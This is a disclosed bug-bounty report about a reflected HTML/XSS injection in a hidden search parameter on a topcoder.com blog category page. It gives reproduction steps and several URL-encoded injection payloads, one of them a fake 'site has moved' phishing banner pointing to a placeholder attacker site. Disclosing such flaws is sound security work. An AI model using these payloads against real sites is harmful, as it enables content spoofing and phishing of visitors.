# Reflected XSS in https://www.topcoder.com/blog/category/community-stories/

## Report Details
- **Report ID**: 1194301
- **URL**: https://hackerone.com/reports/1194301
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-05-12T17:20:40.210Z
- **Disclosed**: 2021-07-12T12:54:59.040Z

## Reporter
- **Username**: c0mbo
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: lab45

## Vulnerability Information
## Summary:
Reflected XSS in https://www.topcoder.com/blog/category/community-stories/
Note: This is a reflected XSS vulnerability in a hidden input.
With that vulnerability, an attacker could write his own code on the website.
But with this vulnerability, an attacker also could lead a user, to go on his attacker's website.

## Steps To Reproduce:

  1. go to the website https://www.topcoder.com/blog/category/community-stories/
  2. in the search field search 123 
  3. The request URL should look like this:https://www.topcoder.com/blog/category/community-stories/?s=123&so=&o=
  4. The &so=&o= after 123 it's the hidden input value, which is vulnerable to reflected XSS
  5. At the end of the URL (at the end of the &so=&o=) write 1"><h1>DOM XSS by c0mbo</h1>
  6. Request URL: https://www.topcoder.com/blog/category/community-stories/?s=123&so=&o=1%22%3E%3Ch1%3EREFLECTED%20XSS%20by%20c0mbo%3C/h1%3E

## Other payloads:
1. https://www.topcoder.com/blog/category/community-stories/?s=123&so=&o=1%22%3E%3Cbutton%3Eclick%20me!%3C/button%3E
2. https://www.topcoder.com/blog/category/community-stories/?s=123&so=&o=1%22%3E%3Ch1%3E!!!ATTENTION!!!%20this%20site%20has%20moved%20to%20[www.attackerssite.com]%20if%20you%20want%20to%20login,%20please%20visit%20[www.attackerssite.com]%3C/h1%3E
3. https://www.topcoder.com/blog/category/community-stories/?s=123&so=&o=1%22%3E%3Ctextarea%3E

## Supporting Material/References:
I made some screenshots :)

Contact me, if you need more info!

Best regards,
@c0mbo

## Impact

With that vulnerability, an attacker can write his own code on the website.
So with that, he could write a message on the website, that this site moved and he has to visit the attacker's site and send the victim the link.
That could for example be a phishing site. This is similar to content spoofing. 
NOTE: Some people would count it as content spoofing, but than it is still in scope, because an attacker can implement / modify HTML on the website, but in my opinion, that's definitly reflected XSS.

## Attachments
- site_has_moved_to_attackers_url.png
- reflected_xss_by_c0mbo.png
- textarea.png
